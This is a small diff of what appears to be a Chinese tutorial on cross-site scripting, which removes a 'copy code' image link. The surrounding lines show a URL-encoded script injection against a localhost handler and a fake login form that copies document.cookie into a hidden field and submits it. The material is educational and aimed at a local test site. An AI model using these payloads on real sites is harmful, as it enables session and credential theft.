@@ -59,7 +59,7 @@ tags:
   http://localhost:1968/WebSite2/msg.ashx?name=%3Cscript%20type%3D%27text/javascript%27%3Ealert%28%27%u4E2D%u884C%u5E86%u5178%u3002%27%29%3C/script%3E
   ```
 
-- [![复制代码](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+- ​
 
   ```HTML
   <form id="form1" action="http://localhost:1968/WebSite2/Default.aspx" method="post"><input type="hidden" id="cookie" name="cookie" /><input type="text" name="accountnum" />密码<input type="password" name="psd" /><input type="button" value="登陆" onclick="document.getElementById('cookie').value=document.cookie;document.getElementById('form1').submit()"/></form>
